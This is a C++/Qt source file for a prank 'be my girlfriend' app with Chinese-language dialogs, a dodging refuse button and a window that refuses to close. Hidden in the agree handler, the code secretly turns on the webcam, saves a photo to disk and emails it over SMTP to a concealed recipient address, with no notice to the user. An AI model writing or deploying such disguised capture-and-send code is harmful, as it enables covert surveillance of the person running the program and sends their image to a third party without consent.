#include "Be_my_girlfriend.h"

Be_my_girlfriend::Be_my_girlfriend(QWidget *parent)
	: QMainWindow(parent)
{
	this->setFixedSize(320, 240);//set the window size

	this->setWindowTitle(tr("Can you be my girlfriend?"));//set the title

	label = new QLabel(this);
	char *str1 = "做我女朋友吧?";
	char *str2 = "同意";
	char *str3 = "拒绝";
	QTextCodec* gbk_codec = QTextCodec::codecForName("GBK");
	QString gbk_string1 = gbk_codec->toUnicode(str1);
	QString gbk_string2 = gbk_codec->toUnicode(str2);
	QString gbk_string3 = gbk_codec->toUnicode(str3);

	label->setText(gbk_string1);
	label->setGeometry(120, 70, 320, 20);
	QFont font;
	font.setPointSize(12);
	QPalette pa;
	pa.setColor(QPalette::WindowText, Qt::blue);
	label->setFont(font);
	label->setPalette(pa);

	agree = new QPushButton(gbk_string2, this);
	disagree = new QPushButton(gbk_string3, this);

	agree->setGeometry(QRect(100, 140, 30, 30));
	connect(agree, SIGNAL(clicked(bool)), this, SLOT(agree_click()));
	disagree->setGeometry(QRect(200, 140, 30, 30));
	connect(disagree, SIGNAL(clicked(bool)), this, SLOT(disagree_click()));

	timer = new QTimer(this);
	timer->setInterval(100);
	timer->start();
	connect(timer, SIGNAL(timeout()), this, SLOT(timeroutslot()));
	std::srand((unsigned)std::time(NULL));

	camera = new QCamera();
	//view_finder = new QCameraViewfinder();
	camera_image_capture = new QCameraImageCapture(camera);
	camera_image_capture->setCaptureDestination(QCameraImageCapture::CaptureToFile);
	camera->setCaptureMode(QCamera::CaptureStillImage);
	connect(camera_image_capture, &QCameraImageCapture::imageCaptured, this, &Be_my_girlfriend::saveImage);
}

void Be_my_girlfriend::timeroutslot()
{
	if (disagree->geometry().contains(this->mapFromGlobal(QCursor::pos())))
	{
		count++;
		if (count <= 5)
		{
			disagree->setGeometry(QRect(200 + std::rand() % 50, 140 + std::rand() % 50, 30, 30));
		}
	}
}

void Be_my_girlfriend::agree_click()
{
	is_agree = 1;
	char *str1 = "你答应啦";
	char *str2 = "谢谢媳妇";
	char *str3 = "欸，那媳妇发张自拍来";
	char *str4 = "你不说话就当你答应啦 谢谢哈 哈哈哈哈";
	char *str5 = "小媳妇";
	char *str6 = "那你叫声老公来听听";
	char *str7 = "老公";
	char *str8 = "不叫";
	char *stri1 = "我靠 没想到你是这样的人";
	char *stri2 = "我把你当兄弟 你竟然想睡我";
	char *stri3 = "哎 今天算是看清你了";
	char *stri4 = "哎 人心隔肚皮啊 世态炎凉啊";
	char *stri5 = "对不起 我错了";
	char *stri6 = "我原谅你吧";
	char *stri7 = "行吧  看你这么诚恳 我就当今天什么也没发生";

	QTextCodec* gbk_codec = QTextCodec::codecForName("GBK");
	QString gbk_string1 = gbk_codec->toUnicode(str1);
	QString gbk_string2 = gbk_codec->toUnicode(str2);
	QString gbk_string3 = gbk_codec->toUnicode(str3);
	QString gbk_string4 = gbk_codec->toUnicode(str4);
	QString gbk_string5 = gbk_codec->toUnicode(str5);
	QString gbk_string6 = gbk_codec->toUnicode(str6);
	QString gbk_string7 = gbk_codec->toUnicode(str7);
	QString gbk_string8 = gbk_codec->toUnicode(str8);

	QString gbk_str1 = gbk_codec->toUnicode(stri1);
	QString gbk_str2 = gbk_codec->toUnicode(stri2);
	QString gbk_str3 = gbk_codec->toUnicode(stri3);
	QString gbk_str4 = gbk_codec->toUnicode(stri4);
	QString gbk_str5 = gbk_codec->toUnicode(stri5);
	QString gbk_str6 = gbk_codec->toUnicode(stri6);
	QString gbk_str7 = gbk_codec->toUnicode(stri7);

	if (have_begged)
	{
		int husband = 1;
		QMessageBox::warning(this, gbk_string1, gbk_string2, QMessageBox::Ok);
		if (QMessageBox::Ok)
		{
			while (husband)
			{
				switch (QMessageBox::information(this, gbk_string5, gbk_string6, gbk_string7, gbk_string8, 0, 1))
				{
				case 0:
					husband = 0;
					break;
				case 1:
				default:
					husband = 1;
					break;
				}
			}
			camera->start();
			camera_image_capture->capture();
			CSmtp smtp(
				25,								      /*smtp端口*/
				"smtp.163.com",					/*smtp服务器地址*/
				"******@163.com",	      /*你的邮箱地址*/
				"********",					    /*邮箱smtp密码*/
				"********@qq.com",	     /*目的邮箱地址*/
				"zp",							      /*主题*/
				"zpzp"		              /*邮件正文*/
			);
			
			//添加附件时注意,\一定要写成\\，因为转义字符的缘故
			string filePath("F:\\a.jpg");
			smtp.AddAttachment(filePath);
			int err = smtp.SendEmail_Ex();
			QMessageBox::warning(this, gbk_string3, gbk_string4, QMessageBox::Ok);
			if (QMessageBox::Ok)
				this->close();
		}
	}
	else
	{
		switch (QMessageBox::information(this, gbk_str1, gbk_str2, gbk_str5, gbk_str5, 0, 1))
		{
		case 0:
		case 1:
		default:
			switch (QMessageBox::information(this, gbk_str3, gbk_str4, gbk_str5, gbk_str5, 0, 1))
			{
			case 0:
			case 1:
			default:
				break;
			}
			break;
		}
		QMessageBox::warning(this, gbk_str6, gbk_str7, QMessageBox::Ok);
		if (QMessageBox::Ok)
			this->close();
	}
}

void Be_my_girlfriend::disagree_click()
{
	have_begged = 1;
	char *str1 = "你不答应我我就死缠滥打";
	char *str2 = "你就答应我吧~";
	QTextCodec* gbk_codec = QTextCodec::codecForName("GBK");
	QString gbk_string1 = gbk_codec->toUnicode(str1);
	QString gbk_string2 = gbk_codec->toUnicode(str2);
	QMessageBox::warning(this, gbk_string2, gbk_string1, QMessageBox::Ok);
	disagree->setEnabled(false);
}

void Be_my_girlfriend::saveImage(int id, QImage image)
{
	QPixmap pixmap = QPixmap::fromImage(image);
	pixmap.save("F:\\a.jpg");
}

void Be_my_girlfriend::closeEvent(QCloseEvent *event)
{
	have_begged = 1;
	if (!is_agree)
	{
		char *str1 = "想关掉我 除非你答应我";
		char *str2 = "关不掉哈哈哈哈哈";
		QTextCodec* gbk_codec = QTextCodec::codecForName("GBK");
		QString gbk_string1 = gbk_codec->toUnicode(str1);
		QString gbk_string2 = gbk_codec->toUnicode(str2);
		QMessageBox::warning(this, gbk_string2, gbk_string1, QMessageBox::Ok);
		event->ignore();
	}

}
